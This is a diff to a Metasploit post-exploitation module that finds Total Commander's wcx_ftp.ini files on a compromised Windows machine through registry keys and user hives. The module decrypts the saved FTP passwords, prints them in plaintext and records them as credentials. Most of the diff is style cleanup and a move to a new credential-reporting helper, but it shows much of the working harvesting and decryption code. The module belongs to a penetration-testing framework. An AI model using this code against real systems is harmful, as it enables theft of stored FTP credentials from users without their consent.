@@ -1,15 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rex/parser/ini'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -31,7 +28,7 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    print_status("Checking Default Locations...")
+    print_status('Checking Default Locations...')
     check_systemroot
 
     grab_user_profiles().each do |user|
@@ -45,25 +42,25 @@ class Metasploit3 < Msf::Post
     hklmpath = registry_getvaldata(commander_key, 'FtpIniName')
     case hklmpath
     when nil
-      print_status("Total Commander Does not Appear to be Installed Globally")
-    when "wcx_ftp.ini"
+      print_status('Total Commander Does not Appear to be Installed Globally')
+    when 'wcx_ftp.ini'
       print_status("Already Checked SYSTEMROOT")
-    when ".\\wcx_ftp.ini"
+    when '.\\wcx_ftp.ini'
       hklminstpath = registry_getvaldata(commander_key, 'InstallDir') || ''
       if hklminstpath.empty?
-        print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
+        print_error('Unable to find InstallDir in registry, skipping wcx_ftp.ini')
       else
         check_other(hklminstpath +'\\wcx_ftp.ini')
       end
     when /APPDATA/
-      print_status("Already Checked AppData")
+      print_status('Already Checked AppData')
     when /USERPROFILE/
-      print_status("Already Checked USERPROFILE")
+      print_status('Already Checked USERPROFILE')
     else
       check_other(hklmpath)
     end
 
-    userhives=load_missing_hives()
+    userhives = load_missing_hives()
     userhives.each do |hive|
       next if hive['HKU'] == nil
       print_status("Looking at Key #{hive['HKU']}")
@@ -72,21 +69,21 @@ class Metasploit3 < Msf::Post
       print_status("HKUP: #{hkupath}")
       case hkupath
       when nil
-        print_status("Total Commander Does not Appear to be Installed on This User")
-      when "wcx_ftp.ini"
+        print_status('Total Commander Does not Appear to be Installed on This User')
+      when 'wcx_ftp.ini'
         print_status("Already Checked SYSTEMROOT")
-      when ".\\wcx_ftp.ini"
+      when '.\\wcx_ftp.ini'
         hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir') || ''
         if hklminstpath.empty?
-          print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
+          print_error('Unable to find InstallDir in registry, skipping wcx_ftp.ini')
         else
           check_other(hklminstpath +'\\wcx_ftp.ini')
         end
       when /APPDATA/
-        print_status("Already Checked AppData")
+        print_status('Already Checked AppData')
 
       when /USERPROFILE/
-        print_status("Already Checked USERPROFILE")
+        print_status('Already Checked USERPROFILE')
       else
         check_other(hkupath)
       end
@@ -120,36 +117,62 @@ class Metasploit3 < Msf::Post
     end
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: fullname,
+      post_reference_name: self.refname,
+      session_id: session_db_id,
+      origin_type: :session,
+      private_data: opts[:password],
+      private_type: :password,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def get_ini(filename)
     config = client.fs.file.new(filename,'r')
     parse = config.read
     ini=Rex::Parser::Ini.from_s(parse)
 
     ini.each_key do |group|
-      next if group=="General" or group == "default" or group=="connections"
+      next if group == 'General' or group == 'default' or group == 'connections'
       print_status("Processing Saved Session #{group}")
       host = ini[group]['host']
 
       username = ini[group]['username']
       passwd = ini[group]['password']
-      next if passwd==nil
+      next if passwd == nil
       passwd = decrypt(passwd)
       (host,port) = host.split(':')
-      port=21 if port==nil
+      port = 21 if port == nil
       print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
       if session.db_record
         source_id = session.db_record.id
       else
         source_id = nil
       end
-      report_auth_info(
-        :host  => host,
-        :port => port,
-        :sname => 'ftp',
-        :source_id => source_id,
-        :source_type => "exploit",
-        :user => username,
-        :pass => passwd
+
+      report_cred(
+        ip: host,
+        port: port,
+        service_name: 'ftp',
+        user: username,
+        password: passwd
       )
     end
   end
@@ -188,7 +211,7 @@ class Metasploit3 < Msf::Post
       b=seed(len)
       t=pwd3[a]
       pwd3[a] = pwd3[b]
-      pwd3[b]=t
+      pwd3[b] = t
     end
 
 
@@ -205,7 +228,7 @@ class Metasploit3 < Msf::Post
     end
 
 
-    fpwd=""
+    fpwd = ""
     pwd3[0,len].map{|a| fpwd << a.chr}
     return fpwd
 
